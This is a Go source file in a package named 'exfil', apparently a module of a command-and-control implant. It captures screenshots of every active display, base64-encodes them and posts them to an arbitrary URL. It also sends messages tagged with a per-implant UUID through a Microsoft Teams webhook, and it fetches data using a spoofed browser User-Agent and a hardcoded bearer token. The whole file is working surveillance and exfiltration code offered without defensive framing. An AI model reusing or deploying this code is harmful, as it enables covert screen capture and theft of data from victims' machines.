package exfil

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"os"
	"strings"

	"github.com/google/uuid"
	"github.com/kbinani/screenshot"
	"github.com/pbberlin/tools/conv"
)

var (
	uid = uuid.New()
)

func GetData(url string) string {

	client := http.Client{}
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		log.Fatalln(err)
	}

	req.Header = http.Header{
		"Accept":        []string{"*/*"},
		"User-Agent":    []string{"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"},
		"Content-Type":  []string{"html/text"},
		"Connection":    []string{"Keep-Alive"},
		"Cache-Control": []string{"no-cache"},
		"Authorization": []string{"Bearer eyJhbGciOiJIUzM4NCIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6Ikdvb2QgbHVjayBoYWNraW5nIG1lIiwiaWF0IjoxNTE2MjM5MDIyfQ.5Q3f35cNecsJ39pZ4C1oPyJ_3CvFyYj7l9reoL0nDzIuenagPJpSJ9Po1Y1Ungn8"},
	}

	res, err := client.Do(req)
	if err != nil {
		log.Fatalln(err)
	}
	body, err := ioutil.ReadAll(res.Body)
	if err != nil {
		log.Fatalln(err)
	}
	//Convert the body to type string
	sb := string(body)
	return sb
}
func ScreenShot() string {

	str_b64 := ""

	n := screenshot.NumActiveDisplays()

	for i := 0; i < n; i++ {
		bounds := screenshot.GetDisplayBounds(i)

		img, err := screenshot.CaptureRect(bounds)
		if err != nil {
			panic(err)
		}
		fileName := fmt.Sprintf("%d_%dx%d.png", i, bounds.Dx(), bounds.Dy())
		file, _ := os.Create(fileName)
		defer file.Close()
		str_b64 = conv.Rgba_img_to_base64_str(img)
		return str_b64

		// png.Encode(file, img)
		// println(str_b64)
		// fmt.Printf("#%d : %v \"%s\"\n", i, bounds, fileName)
	}
	return str_b64
}

// Image in base64 with URL encoded
func SendIMG(url_target string) {
	var image string = ScreenShot()
	var data string = fmt.Sprint(image)
	data_post := url.Values{
		"Image": {data},
	}
	resp, err := http.PostForm(url_target, data_post)
	if err != nil {
		fmt.Print(resp)
	}
}

// based in https://github.com/b4r0nd3l4b1rr4/Teams-CS-Notifier
func SendTeamsMessage(webhookURL, message string) {
	headers := map[string]string{
		"Content-Type": "application/json",
	}

	payload := map[string]interface{}{
		"@type":    "MessageCard",
		"@context": "http://schema.org/extensions",
		"summary":  "New Message",
		"sections": []map[string]string{
			{
				"activityTitle": "New message",
				"text":          fmt.Sprintf("UID: %s\n%s", uid.String(), message),
			},
		},
	}

	payloadBytes, err := json.Marshal(payload)
	if err != nil {
		fmt.Println("Error marshaling payload:", err)
		return
	}

	client := &http.Client{}
	req, err := http.NewRequest("POST", webhookURL, strings.NewReader(string(payloadBytes)))
	if err != nil {
		fmt.Println("Error creating request:", err)
		return
	}

	for key, value := range headers {
		req.Header.Add(key, value)
	}

	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Error sending request to Teams:", err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		body, _ := ioutil.ReadAll(resp.Body)
		fmt.Printf("Request to Teams returned an error %d, the response is:\n%s\n", resp.StatusCode, string(body))
	}
}
